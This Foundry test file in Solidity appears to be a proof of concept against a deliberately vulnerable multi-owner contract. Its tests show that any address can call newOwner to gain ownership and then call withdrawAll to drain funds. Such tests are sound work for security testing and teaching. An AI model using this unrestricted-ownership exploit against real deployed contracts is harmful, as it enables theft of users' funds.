// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/multiowned_vulnerable.sol";

contract UnrestrictedNewOwnerTest is Test {
    TestContract public multiOwnable;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    address newOwnerAddr = makeAddr("newOwnerAddr");

    function setUp() public {
        vm.prank(owner);
        multiOwnable = new TestContract();
    }

    function test_unrestrictedNewOwner() public {
        // Validate attacker is not owner initially
        vm.prank(attacker);
        vm.expectRevert();
        multiOwnable.withdrawAll();

        // Differential state check before attack
        console.log("--- BEFORE-Trigger newOwner ---");
        address attackerOwnerStatusBefore = multiOwnable.owners(attacker);
        console.log("Owner status of attacker before:", attackerOwnerStatusBefore);

        console.log("--- Trigger newOwner (attacker becomes owner) ---");
        // Attacker successfully adds themselves as new owner
        vm.prank(attacker);
        multiOwnable.newOwner(attacker);

        // Differential state check after attack
        console.log("--- AFTER-Trigger newOwner ---");
        address attackerOwnerStatusAfter = multiOwnable.owners(attacker);
        console.log("Owner status of attacker after:", attackerOwnerStatusAfter);

        // Comparison and verdict
        if (attackerOwnerStatusAfter != address(0)) {
            console.log("Vulnerability Exists: Unauthorized address became an owner");
        }

        // Attacker can now bypass onlyOwner protection
        vm.prank(attacker);
        multiOwnable.withdrawAll();  // Protected function call
    }

    function test_anyoneCanAssignOwnership() public {
        // Differential state check before attack
        console.log("--- BEFORE-Trigger newOwner ---");
        address newOwnerStatusBefore = multiOwnable.owners(newOwnerAddr);
        console.log("Owner status of newOwnerAddr before:", newOwnerStatusBefore);

        console.log("--- Trigger newOwner (non-owner adds newOwnerAddr) ---");
        // Non-owner assigns arbitrary address as new owner
        vm.prank(address(0x123));
        multiOwnable.newOwner(newOwnerAddr);

        // Differential state check after attack
        console.log("--- AFTER-Trigger newOwner ---");
        address newOwnerStatusAfter = multiOwnable.owners(newOwnerAddr);
        console.log("Owner status of newOwnerAddr after:", newOwnerStatusAfter);

        // Comparison and verdict
        if (newOwnerStatusAfter != address(0)) {
            console.log("Vulnerability Exists: Unauthorized address assigned ownership");
        }

        // Validate new owner can access protected function
        vm.prank(newOwnerAddr);
        multiOwnable.withdrawAll();  // Doesn't revert
    }
}